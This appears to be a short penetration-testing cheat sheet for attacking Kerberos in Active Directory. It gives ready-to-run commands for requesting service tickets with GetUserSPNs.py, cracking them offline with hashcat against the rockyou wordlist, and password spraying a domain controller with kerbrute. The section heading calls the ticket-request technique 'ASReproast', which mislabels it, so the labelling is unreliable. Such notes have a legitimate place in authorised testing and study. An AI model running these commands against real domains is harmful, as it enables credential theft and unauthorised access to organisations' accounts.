# Kerberos

### ASReproast

```
python3 /usr/local/bin/GetUserSPNs.py domain.com/user:password -dc-ip $ip -request
```

```
hashcat -d 2 krb5tgs.txt -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
```

### Password Spraying

_Kerbrute_

```
kerbrute passwordspray -d domain.com --dc $ip users.txt
```
